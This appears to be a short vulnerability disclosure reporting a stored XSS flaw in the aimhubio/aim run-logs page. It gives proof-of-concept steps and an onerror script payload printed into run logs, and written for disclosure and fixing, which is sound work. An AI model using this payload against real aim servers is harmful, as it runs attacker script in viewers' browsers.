Title: Stored XSS through run logs in aimhubio/aim

Proof of Concept: 
Run the aim UI and the remote tracking server by using the following commands:

aim server
aim up

Run the following python-file after following a valid Python-install of the aim SDK:

from aim import Run

run = Run(repo="aim://SERVER_IP:53800")

print("<image src/onerror=prompt(8)>")

Navigate to http://SERVER_IP:43800/runs/RUN_ID/logs (found by navigating to http://SERVER_IP:43800/runs/, clicking on the run, and going to the logs-tab)

Impact: 
This seems like a standard stored XSS vulnerability. It does not require any user input to trigger, and can be prepared/hidden among "actual" log entries by the attacker for any run.
